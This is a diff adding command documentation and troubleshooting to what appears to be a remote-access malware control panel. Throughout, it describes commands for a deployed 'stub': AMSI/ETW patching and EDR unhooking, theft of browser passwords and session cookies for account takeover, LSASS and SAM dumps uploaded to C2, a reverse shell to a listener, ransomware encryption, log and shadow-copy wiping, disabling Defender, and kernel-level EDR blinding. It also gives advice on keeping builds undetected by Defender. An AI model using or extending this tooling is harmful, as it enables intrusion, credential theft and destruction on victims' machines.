@@ -2667,6 +2667,68 @@ system netstat -ano
 system dir C:\Users\Username\Desktop</div>
 </div>
 
+<!-- ════════════════════════════════════════════ TROUBLESHOOTING ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Troubleshooting — Fixing Your Own Test Machine</div>
+  <p class="docs-p">If the stub ran on your own machine during testing, it may have left side-effects. Run these PowerShell commands (as your own user, no admin needed) to clean up.</p>
+
+  <div class="docs-h2" style="font-size:12px;color:var(--warn);text-transform:none;letter-spacing:0;margin-top:4px">Task Manager not opening (loads and does nothing)</div>
+  <div class="docs-note">Cause: <code>defkill taskmgr</code> was sent, which sets HKCU DisableTaskMgr=1.
+Fix — run in PowerShell:
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f</div>
+
+  <div class="docs-h2" style="font-size:12px;color:var(--warn);text-transform:none;letter-spacing:0;margin-top:12px">Wireshark not starting / closing immediately</div>
+  <div class="docs-note">Cause: The <b>Protector/AntiProcesses</b> thread is running and calls ExitProcess on wireshark.exe when it's detected.
+Fix — kill the stub first, then open Wireshark:
+Stop-Process -Name "RuntimeBroker" -Force -EA 0
+Stop-Process -Name "WindowsUpdate" -Force -EA 0
+Then open Wireshark. If it still closes, disable the Protector flag in Builder before the next build.</div>
+
+  <div class="docs-h2" style="font-size:12px;color:var(--warn);text-transform:none;letter-spacing:0;margin-top:12px">Process Hacker / Task Manager keeps closing itself</div>
+  <div class="docs-note">Same cause as above — AntiProcesses detects processhacker.exe and taskmgr.exe window titles.
+Fix — kill the stub EXE and its protector copy, then reopen your tools.
+# Kill stub + protector
+Stop-Process -Name "RuntimeBroker" -Force -EA 0
+Stop-Process -Name "WindowsUpdate" -Force -EA 0
+# Remove Run key persistence
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RuntimeBroker /f 2>$null
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /f 2>$null
+# Remove marker key (so stub doesn't think it's installed)
+reg delete "HKCU\Software\Microsoft\IdentityStore" /f 2>$null
+# Reboot to clear any leftover processes</div>
+
+  <div class="docs-h2" style="font-size:12px;color:var(--warn);text-transform:none;letter-spacing:0;margin-top:12px">Full cleanup — remove stub from your own machine completely</div>
+  <div class="docs-note"># 1. Kill the stub and its protector
+Stop-Process -Name "RuntimeBroker" -Force -EA 0
+Stop-Process -Name "WindowsUpdate" -Force -EA 0
+
+# 2. Remove Run key (use whatever name you set in Builder)
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RuntimeBroker /f 2>$null
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate /f 2>$null
+
+# 3. Remove marker key
+reg delete "HKCU\Software\Microsoft\IdentityStore" /f 2>$null
+
+# 4. Delete the EXE (use the drop path you set in Builder)
+Remove-Item "$env:APPDATA\Microsoft\Windows\Helpers\*" -Force -EA 0
+Remove-Item "$env:APPDATA\OneDriveHelper.exe" -Force -EA 0
+
+# 5. Restore Task Manager if blocked
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f 2>$null
+
+# 6. Reboot</div>
+
+  <div class="docs-h2" style="font-size:12px;color:var(--warn);text-transform:none;letter-spacing:0;margin-top:12px">Defender keeps quarantining the stub</div>
+  <div class="docs-note">Most likely causes:
+1. Stub was not rebuilt after the last source change — always rebuild after any code change.
+2. Autorun name or drop filename contains "WindowsUpdate" — change to something like "RuntimeBroker" in Builder.
+3. Protector flag is ON — creates AntiProcesses behavior that Defender detects.
+   → Disable Protector in Builder for less-detectable builds.
+4. Cloud-delivered protection is ON — turn it off in Windows Security → Virus &amp; threat protection → Manage settings.
+Quick fix: After rebuilding, add the drop path as a Defender exclusion before deploying:
+  defkill exclude C:\path\to\drop\folder</div>
+</div>
+
 <!-- ══════════════════════════════════════════════════ SERVER NOTES ══ -->
 <div class="docs-section">
   <div class="docs-h2">Server &amp; Deployment Notes</div>
@@ -2684,6 +2746,385 @@ system dir C:\Users\Username\Desktop</div>
       </tbody>
     </table>
   </div>
+</div>
+
+<!-- ════════════════════════════════════════════ EVASION ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Evasion</div>
+  <p class="docs-p">Patch in-memory defenses, unhook EDR, and run encrypted-sleep tests. Run <code>evasion all</code> on every new bot as a first step.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:240px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>evasion amsi</td><td>Patches <code>AmsiScanBuffer</code> in <code>amsi.dll</code> so it always returns E_INVALIDARG. Disables PowerShell/VBScript script scanning for the process lifetime.</td></tr>
+        <tr><td>evasion etw</td><td>Blinds <code>EtwEventWrite</code> in ntdll — kills ETW telemetry from this process. Events from this stub will no longer reach Security Center or EDR collection pipes.</td></tr>
+        <tr><td>evasion unhook</td><td>Re-reads ntdll.dll from disk and restores its .text section in memory, removing any user-mode API hooks placed by AV/EDR. Run this to bypass Elastic, CrowdStrike, SentinelOne hooks.</td></tr>
+        <tr><td>evasion hookcheck</td><td>Scans all Nt* stubs in ntdll and reports which ones have been hooked by EDR (hotpatched with a JMP). Shows you exactly what the installed security product is monitoring.</td></tr>
+        <tr><td>evasion obfsleep &lt;ms&gt;</td><td>Test one encrypted-sleep cycle: encrypts .text section, sleeps for &lt;ms&gt; milliseconds, decrypts on wake. During sleep the process appears as garbage to memory scanners. Example: <code>evasion obfsleep 10000</code></td></tr>
+        <tr><td>evasion all</td><td>Runs AMSI patch + ETW blind + ntdll unhook in one shot. Recommended as first command on any new bot.</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════ TOKEN STEALING ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Token Stealing</div>
+  <p class="docs-p">Steal and impersonate Windows access tokens to escalate privileges. Requires admin. MITRE T1134.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:240px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>tokensteal</td><td>Finds a SYSTEM-level process, duplicates its token, and impersonates it on the current thread. After this, the stub acts as NT AUTHORITY\SYSTEM for all subsequent operations.</td></tr>
+        <tr><td>tokenshell &lt;exe_path&gt;</td><td>Spawns a new process under the stolen SYSTEM token. Example: <code>tokenshell C:\Windows\System32\cmd.exe</code> — gives you a hidden SYSTEM shell.</td></tr>
+        <tr><td>tokenrevert</td><td>Reverts the thread token back to the original user token. Use after you're done with SYSTEM-level operations.</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════ CREDENTIAL DUMP ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Credential Dump</div>
+  <p class="docs-p">Extract saved passwords and session cookies. MITRE T1555, T1539.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:240px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>creddump credman</td><td>Dumps all credentials stored in Windows Credential Manager (DPAPI-encrypted passwords for network shares, websites, RDP sessions, etc.).</td></tr>
+        <tr><td>creddump chrome</td><td>Extracts saved usernames + passwords from Chrome and Edge password managers. Uses DPAPI + AES-GCM decryption. Returns plaintext credentials.</td></tr>
+        <tr><td>creddump cookies</td><td>Extracts Chrome/Edge session cookies. Can be used for Google account takeover without knowing the password (cookie injection).</td></tr>
+        <tr><td>creddump cookiesdb</td><td>Uploads the raw Chrome Cookies SQLite database file to C2 for offline decryption. Use when real-time decryption fails (browser locked). Decrypt with: <code>python3 decrypt_cookies.py --db &lt;file&gt; --key &lt;master_key_hex&gt;</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════ CLIPBOARD MONITOR ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Clipboard Monitor</div>
+  <p class="docs-p">Silently capture everything copied to the clipboard — passwords, crypto addresses, text, links. MITRE T1115.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:200px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>clipmon start</td><td>Start the background clipboard monitor. Captures every clipboard change silently.</td></tr>
+        <tr><td>clipmon stop</td><td>Stop the monitor. Buffer is preserved until you dump or restart.</td></tr>
+        <tr><td>clipmon dump</td><td>Return all captured clipboard entries with timestamps. Buffer is cleared after dump.</td></tr>
+        <tr><td>clipmon status</td><td>Check whether the monitor is currently running.</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="docs-note">Clipboard monitor is <b>not</b> started automatically — you must send <code>clipmon start</code> to activate it.</div>
+</div>
+
+<!-- ════════════════════════════════════════ DOCUMENT OPS ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Document Ops (Excel)</div>
+  <p class="docs-p">Read and write Excel spreadsheets via COM automation or raw file transfer. Excel must be installed for COM commands. Raw read/write works on any file. MITRE T1005.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:310px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>xlread &lt;path&gt; &lt;sheet&gt; &lt;range&gt;</td><td>Read cells from an Excel file via COM. Example: <code>xlread C:\Work\report.xlsx Sheet1 A1:D10</code></td></tr>
+        <tr><td>xlwrite &lt;path&gt; &lt;sheet&gt; &lt;cell&gt; &lt;value&gt;</td><td>Write a cell value via COM (auto-saves). Example: <code>xlwrite C:\Work\report.xlsx Sheet1 B3 999</code></td></tr>
+        <tr><td>xlrawread &lt;path&gt;</td><td>Read any file as base64 and return it. Works on any format — use this to exfiltrate .xlsx, .docx, .pdf, .zip without needing the app installed.</td></tr>
+        <tr><td>xlrawwrite &lt;path&gt; &lt;base64&gt;</td><td>Overwrite a file from a base64 blob (sent from C2). Lets you push edited files back to the target.</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════ LSASS DUMP ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — LSASS Dump</div>
+  <p class="docs-p">Dump lsass.exe process memory to extract NTLM hashes, Kerberos tickets, and plaintext credentials. Requires SYSTEM or SeDebugPrivilege. MITRE T1003.001.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:260px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>lsass dump &lt;outpath&gt;</td><td>Direct MiniDumpWriteDump call on lsass.exe. Example: <code>lsass dump C:\Windows\Temp\lsass.dmp</code></td></tr>
+        <tr><td>lsass comsvcs &lt;outpath&gt;</td><td>Dump via rundll32 + comsvcs.dll (different detection surface from direct dump). Example: <code>lsass comsvcs C:\Windows\Temp\lsass.dmp</code></td></tr>
+        <tr><td>lsass pull [outpath]</td><td>Dump lsass to a temp path, upload the .dmp file to C2, then delete the local file. One command to exfiltrate the dump. Analyse with Mimikatz: <code>sekurlsa::minidump lsass.dmp</code> → <code>sekurlsa::logonpasswords</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="docs-warn">⚠ lsass dump is one of the most-detected operations. Run <code>evasion all</code> first. Consider using <code>tokensteal</code> to run as SYSTEM before dumping.</div>
+</div>
+
+<!-- ══════════════════════════════════════ PRIVILEGE ESC ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Privilege Escalation</div>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:260px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>uac fodhelper &lt;cmd&gt;</td><td>Auto-elevate to admin via ms-settings COM hijack (no UAC prompt). Example: <code>uac fodhelper C:\Windows\System32\cmd.exe</code>. MITRE T1548.002.</td></tr>
+        <tr><td>uac eventvwr &lt;cmd&gt;</td><td>Auto-elevate via mscfile COM hijack. Alternative bypass when fodhelper is patched. Example: <code>uac eventvwr cmd.exe</code></td></tr>
+        <tr><td>samdump [outdir]</td><td>Save SAM, SYSTEM, and SECURITY registry hives to a directory (requires SYSTEM). Use with Impacket/secretsdump to extract all local account hashes offline. Default dir: <code>C:\Windows\Temp</code></td></tr>
+        <tr><td>wifi</td><td>Dump all saved Wi-Fi passwords from Windows (requires admin). Shows SSID + plaintext password for every saved network.</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════ ANTI-FORENSICS ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Anti-Forensics</div>
+  <p class="docs-p">Cover tracks, destroy evidence, and manipulate file metadata. MITRE T1070, T1485, T1564.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:300px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>af clearlogs <span class="docs-tag docs-tag-danger">DANGER</span></td><td>Wipe all Windows Event Log channels (Security, System, Application, and every other log). Erases all forensic evidence of this session. Cannot be undone.</td></tr>
+        <tr><td>af vssdelete <span class="docs-tag docs-tag-danger">DANGER</span></td><td>Delete all Volume Shadow Copies via WMI. Destroys ransomware recovery points. Cannot be undone.</td></tr>
+        <tr><td>af timestomp &lt;target&gt; [ref]</td><td>Copy timestamps (Created/Modified/Accessed) from a reference file onto the target file, or set generic past timestamps if no reference given. Defeats timeline-based forensic analysis. Example: <code>af timestomp C:\tool.exe C:\Windows\System32\notepad.exe</code></td></tr>
+        <tr><td>af adswrite &lt;file&gt; &lt;stream&gt; &lt;data&gt;</td><td>Write data to an NTFS Alternate Data Stream — hides data inside a normal file without changing its visible size. Example: <code>af adswrite C:\file.txt hidden secretdata</code>. Read it back with <code>af adsread</code>.</td></tr>
+        <tr><td>af adsread &lt;file&gt; &lt;stream&gt;</td><td>Read data from an NTFS ADS. Example: <code>af adsread C:\file.txt hidden</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════ INJECTION ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Code Injection</div>
+  <p class="docs-p">Execute shellcode or payloads inside other processes. MITRE T1055.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:280px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>hollow &lt;target.exe&gt; &lt;shellcode_b64&gt;</td><td>Process Hollowing — creates the target suspended, replaces its memory with shellcode, resumes. The process appears to be the legitimate target in Task Manager. MITRE T1055.012.</td></tr>
+        <tr><td>apc &lt;pid&gt; &lt;shellcode_b64&gt;</td><td>Queue shellcode as an APC on all threads of the target PID. Executes when a thread enters alertable state. Example: <code>apc 1234 &lt;base64_shellcode&gt;</code>. MITRE T1055.004.</td></tr>
+        <tr><td>apcinject demo [exe]</td><td>Early-bird APC injection demo — spawns target exe suspended, injects demo shellcode via APC, resumes. Shows the technique without a custom payload.</td></tr>
+        <tr><td>apcinject existing &lt;pid&gt;</td><td>Queue a demo APC on all threads of a running PID.</td></tr>
+        <tr><td>threadhijack list &lt;pid&gt;</td><td>List all threads in a process. Use to pick a target thread for hijacking.</td></tr>
+        <tr><td>threadhijack hijack &lt;pid&gt; [tid]</td><td>Suspend a thread, set its RIP to demo shellcode, resume. Demonstrates T1055.003 (Thread Execution Hijacking).</td></tr>
+        <tr><td>doppelgang check</td><td>Check if Transactional NTFS (TxF) is available on this system (required for Doppelgänging).</td></tr>
+        <tr><td>doppelgang spawn &lt;host.exe&gt; &lt;pay.exe&gt;</td><td>Process Doppelgänging — runs payload masquerading as a legitimate EXE. On-disk image = host, in-memory = payload. MITRE T1055.013.</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════ NET DISCOVERY ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Network Discovery</div>
+  <p class="docs-p">Map the local network from the target machine. Useful for lateral movement planning. MITRE T1018, T1046, T1016.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:280px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>netscan sweep &lt;prefix&gt;</td><td>ICMP ping-sweep a /24 subnet. Returns list of responding hosts. Example: <code>netscan sweep 192.168.1</code> → pings 192.168.1.1 through 192.168.1.254.</td></tr>
+        <tr><td>netscan ports &lt;ip&gt; &lt;start&gt; &lt;end&gt;</td><td>TCP connect-scan a port range on a single host. Example: <code>netscan ports 192.168.1.1 1 1024</code></td></tr>
+        <tr><td>netscan arp</td><td>Dump the local ARP cache — shows MAC→IP mappings of recently-contacted hosts on the same subnet. Fast and silent (no packets sent).</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════ WMI PERSISTENCE ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — WMI Persistence</div>
+  <p class="docs-p">Create event-driven persistence via WMI subscriptions — survives reboots, invisible in standard autoruns. MITRE T1546.003.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:300px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>wmipersist install &lt;name&gt; &lt;cmd&gt;</td><td>Create a permanent WMI event subscription that runs &lt;cmd&gt; on every logon. Not visible in Task Scheduler or Run keys. Example: <code>wmipersist install BackupSvc C:\Users\Public\tool.exe</code></td></tr>
+        <tr><td>wmipersist remove &lt;name&gt;</td><td>Remove the WMI subscription by name. Example: <code>wmipersist remove BackupSvc</code></td></tr>
+        <tr><td>wmipersist list</td><td>List all installed WMI event subscriptions (yours and any others already present).</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════ RANSOM SIM ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Ransomware Simulation</div>
+  <p class="docs-p">Encrypt and decrypt files to demonstrate ransomware capability. For testing only — always decrypt after encrypting. MITRE T1486.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:280px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>ransom encrypt &lt;dir&gt; &lt;key&gt;</td><td>Recursively encrypt every file in the directory with AES using the given key. Files get a <code>.b4db4b3</code> extension. Example: <code>ransom encrypt C:\TestFiles testkey</code></td></tr>
+        <tr><td>ransom decrypt &lt;dir&gt; &lt;key&gt; <span class="docs-tag docs-tag-ok">RESTORE</span></td><td>Recursively decrypt every <code>.b4db4b3</code> file using the same key. Example: <code>ransom decrypt C:\TestFiles testkey</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="docs-warn">⚠ Always run <code>ransom decrypt</code> with the same key after testing. Use a dedicated test folder, never a real user directory.</div>
+</div>
+
+<!-- ══════════════════════════════════ BROWSER HISTORY ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Browser History</div>
+  <p class="docs-p">Extract browsing history and download history from Chrome and Edge. MITRE T1217.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:240px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>browserhistory urls</td><td>Return all visited URLs from Chrome/Edge history with visit counts and timestamps.</td></tr>
+        <tr><td>browserhistory downloads</td><td>Return the file paths of everything the user has downloaded.</td></tr>
+        <tr><td>browserhistory db</td><td>Upload the raw Chrome History SQLite database to C2. Use for offline analysis with SQLite tools.</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════ REVSHELL ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Reverse Shell</div>
+  <p class="docs-p">Open a raw TCP reverse shell back to a listener you control. MITRE T1059.003.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:260px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>revshell connect &lt;ip&gt; &lt;port&gt;</td><td>Connect a cmd.exe shell to your listener. Start the listener first: <code>nc -lvp &lt;port&gt;</code>. Example: <code>revshell connect 10.0.0.5 9999</code></td></tr>
+        <tr><td>revshell disconnect</td><td>Close the reverse shell connection.</td></tr>
+        <tr><td>revshell status</td><td>Check whether a reverse shell is currently active.</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════ PPID SPOOF ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — PPID Spoofing</div>
+  <p class="docs-p">Spawn processes with a fake parent PID — hides suspicious processes under trusted parent processes like explorer.exe. MITRE T1134.004.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:280px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>ppidspoof &lt;pid&gt; &lt;cmdline&gt;</td><td>Spawn a process with the given PID as its spoofed parent. Example: <code>ppidspoof 1234 cmd.exe</code></td></tr>
+        <tr><td>ppidspoof explorer &lt;cmdline&gt;</td><td>Auto-find explorer.exe and use it as the fake parent. Example: <code>ppidspoof explorer powershell.exe</code></td></tr>
+        <tr><td>ppidspoof svchost &lt;cmdline&gt;</td><td>Use svchost.exe as the fake parent — makes processes appear as Windows service children.</td></tr>
+        <tr><td>ppidspoof findpid &lt;name.exe&gt;</td><td>Look up the PID of any running process. Example: <code>ppidspoof findpid explorer.exe</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════ DEFENSE KILL ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Defense Kill</div>
+  <p class="docs-p">Disable Windows Defender, Firewall, and security tools. <b>Only run these when explicitly required for a test</b> — they are highly visible to blue teams. MITRE T1562.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:280px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>defkill defender <span class="docs-tag docs-tag-danger">DANGER</span></td><td>Disable Windows Defender via registry policy + Set-MpPreference + service stop. Very loud — generates multiple Security Center and Sysmon events.</td></tr>
+        <tr><td>defkill defender enable</td><td>Re-enable Windows Defender (for cleanup / after test).</td></tr>
+        <tr><td>defkill firewall <span class="docs-tag docs-tag-danger">DANGER</span></td><td>Disable Windows Firewall on all profiles (Standard, Public, Domain). Sends netsh command + registry write.</td></tr>
+        <tr><td>defkill firewall enable</td><td>Re-enable Windows Firewall on all profiles.</td></tr>
+        <tr><td>defkill taskmgr <span class="docs-tag docs-tag-danger">DANGER</span></td><td>Block the user from opening Task Manager (sets DisableTaskMgr registry key). Run <code>defkill taskmgr enable</code> to restore it.</td></tr>
+        <tr><td>defkill taskmgr enable</td><td>Restore Task Manager access (removes DisableTaskMgr key).</td></tr>
+        <tr><td>defkill exclude &lt;path&gt;</td><td>Add a path to Defender's exclusion list so files there are never scanned. Example: <code>defkill exclude C:\Users\Public</code>. Use before dropping tools.</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="docs-warn">⚠ <code>defkill taskmgr</code> blocks Task Manager for the current user. Always follow with <code>defkill taskmgr enable</code> to restore it.</div>
+</div>
+
+<!-- ══════════════════════════════ HIJACK / PERSIST ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Hijacking &amp; Alternate Persistence</div>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:320px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>comhijack find</td><td>Scan HKCU and HKLM COM registrations for CLSIDs where HKCU can override HKLM — hijackable without admin. Returns a list of targets.</td></tr>
+        <tr><td>comhijack install {CLSID} &lt;dll_path&gt;</td><td>Install a DLL hijack: register a HKCU InprocServer32 for the CLSID. Any application that activates this CLSID will load your DLL.</td></tr>
+        <tr><td>comhijack exe {CLSID} &lt;exe_path&gt;</td><td>Install an EXE hijack: register a LocalServer32. Application activates CLSID → your EXE runs.</td></tr>
+        <tr><td>comhijack remove {CLSID}</td><td>Remove the HKCU COM override.</td></tr>
+        <tr><td>comhijack list</td><td>List all currently installed COM overrides.</td></tr>
+        <tr><td>ifeohijack list</td><td>List all Image File Execution Options debugger entries currently on the system.</td></tr>
+        <tr><td>ifeohijack install &lt;target.exe&gt; &lt;our.exe&gt;</td><td>IFEO hijack: set our EXE as the "debugger" for target.exe — whenever target.exe is launched, our EXE runs instead. MITRE T1546.012.</td></tr>
+        <tr><td>ifeohijack silent &lt;target.exe&gt; &lt;mon.exe&gt;</td><td>Silent exit monitor IFEO — runs quietly alongside the target, not instead of it.</td></tr>
+        <tr><td>ifeohijack remove &lt;target.exe&gt;</td><td>Remove the IFEO hijack for the target EXE.</td></tr>
+        <tr><td>dllhijack common</td><td>Scan well-known paths for DLLs that can be planted — applications that load a DLL by name from a writable directory.</td></tr>
+        <tr><td>dllhijack scan &lt;exe_path&gt;</td><td>Analyse a specific EXE's imports and find which DLLs could be hijacked from its directory.</td></tr>
+        <tr><td>dllhijack plant &lt;drop_path&gt; &lt;our_exe&gt;</td><td>Copy our EXE to the hijack path as a simple DLL copy. Combined with <code>dllhijack scan</code> to pick the right target.</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════ LSA / DCSYNC ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — LSA Secrets &amp; DCSync</div>
+  <p class="docs-p">Extract domain credentials and replicate AD user hashes. MITRE T1003.004, T1003.006.</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:240px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>lsasecrets names</td><td>List all LSA secret key names stored in HKLM\SECURITY\Policy\Secrets (requires SYSTEM).</td></tr>
+        <tr><td>lsasecrets api</td><td>Dump secrets via LsaRetrievePrivateData API. Returns service account passwords, machine account hashes, etc.</td></tr>
+        <tr><td>lsasecrets registry</td><td>Dump secrets via registry hive save — bypasses API audit logging. Stealthier than the API method.</td></tr>
+        <tr><td>dcsync check</td><td>Verify this machine is domain-joined and the DC is reachable.</td></tr>
+        <tr><td>dcsync privcheck</td><td>Check if the current account has replication privileges (needed for DCSync).</td></tr>
+        <tr><td>dcsync enum [dc_hostname]</td><td>Enumerate all domain users via LDAP.</td></tr>
+        <tr><td>dcsync replicate &lt;username&gt;</td><td>Request DC replication for a specific user — retrieves their NTLM hash. Generates Security Event 4662. Example: <code>dcsync replicate Administrator</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════ KERNEL / BYOVD ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — BYOVD / Kernel</div>
+  <p class="docs-p">Bring-Your-Own-Vulnerable-Driver to kill EDR kernel callbacks. Requires a copy of RTCore64.sys. MITRE T1562.001 (kernel-level).</p>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:260px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>byovd status</td><td>Check whether RTCore64.sys is loaded and its device handle is open.</td></tr>
+        <tr><td>byovd demo &lt;driver_path&gt;</td><td>Load RTCore64.sys, test kernel read/write, then unload it. Must run before any <code>kernelunhook</code> or <code>etwti</code> commands. Example: <code>byovd demo C:\tools\RTCore64.sys</code></td></tr>
+        <tr><td>kernelunhook list</td><td>List all PsSetCreateProcessNotifyRoutine callbacks currently registered in the kernel. Shows which EDR products have kernel hooks.</td></tr>
+        <tr><td>kernelunhook remove</td><td>Remove non-Microsoft process-notify callbacks — blinds EDR products that rely on kernel process-creation events.</td></tr>
+        <tr><td>kernelunhook nuke</td><td>Remove ALL non-Microsoft kernel callbacks of all types (process, thread, image-load). Completely blinds kernel-level EDR monitoring.</td></tr>
+        <tr><td>etwti check</td><td>Show the current ETW-Ti (Threat Intelligence) EnableCount in the kernel.</td></tr>
+        <tr><td>etwti blind</td><td>Zero the ETW-Ti EnableCount in kernel memory — kills Microsoft Defender ATP's kernel telemetry stream. Very effective against Defender for Endpoint.</td></tr>
+        <tr><td>etwti restore</td><td>Restore ETW-Ti EnableCount to 1 (for cleanup).</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="docs-warn">⚠ BYOVD requires loading a signed-but-vulnerable driver. Requires admin. Loading a driver generates Sysmon EID 6 and Windows Security Event 7045.</div>
+</div>
+
+<!-- ══════════════════════════════════════ ADVANCED ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Advanced Memory &amp; PE</div>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:260px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>pestamp mz</td><td>Zero the MZ magic bytes in the PE header of this running process — basic header stomp to break memory-scanner signature matching.</td></tr>
+        <tr><td>pestamp full</td><td>Wipe the entire DOS + NT header from the in-memory PE. Makes the process image unrecognisable to most memory forensic tools.</td></tr>
+        <tr><td>pestamp restore</td><td>Restore the PE headers from a saved copy. Use to revert after testing.</td></tr>
+        <tr><td>pestamp check</td><td>Report the current state of the PE headers (intact / MZ zeroed / full stomp).</td></tr>
+        <tr><td>heapenc test &lt;ms&gt;</td><td>Encrypt all heap chunks, sleep for &lt;ms&gt;ms, then decrypt. During the window, scan this process with a memory scanner — heap will appear as random bytes. Example: <code>heapenc test 10000</code></td></tr>
+        <tr><td>stomp list</td><td>List candidate DLLs loaded in-process whose .text section can be used for module stomping (shellcode hiding).</td></tr>
+        <tr><td>stackspoof report</td><td>Show the spoofed vs real call-stack addresses. Demonstrates how stack spoofing hides suspicious call origins from EDR stack-walk detection.</td></tr>
+        <tr><td>isyscall gadget</td><td>Show the syscall;ret gadget address inside ntdll used for indirect syscalls — confirms the technique is working.</td></tr>
+        <tr><td>antianalysis full</td><td>Run all anti-analysis checks and return a report: debugger, VM, sandbox, user-activity detection. Useful for confirming a target is a real machine.</td></tr>
+        <tr><td>antianalysis debug / vm / sandbox / user</td><td>Run individual check categories from the antianalysis suite.</td></tr>
+      </tbody>
+    </table>
